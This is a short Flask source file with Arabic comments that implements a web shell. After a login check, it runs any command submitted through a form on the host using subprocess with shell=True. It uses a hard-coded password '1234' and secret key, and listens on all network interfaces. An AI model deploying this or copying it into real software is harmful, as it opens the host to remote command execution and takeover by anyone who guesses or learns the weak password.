from flask import Flask, render_template, request, redirect, session
import subprocess
import os

app = Flask(__name__)
app.secret_key = "WXCVBN1234"   # غيره

PASSWORD = "1234"  # كلمة المرور للدخول للشيل

command_logs = []

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        if request.form.get("password") == PASSWORD:
            session["auth"] = True
            return redirect("/shell")
    return render_template("login.html")


@app.route("/shell", methods=["GET", "POST"])
def shell():
    if "auth" not in session:
        return redirect("/")

    output = ""
    if request.method == "POST":
        command = request.form.get("command")

        try:
            result = subprocess.check_output(
                command, shell=True, stderr=subprocess.STDOUT, text=True
            )
            output = result
        except subprocess.CalledProcessError as e:
            output = e.output

        command_logs.append({"cmd": command, "out": output})

    return render_template("shell.html", output=output, logs=command_logs)


@app.route("/logout")
def logout():
    session.clear()
    return redirect("/")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
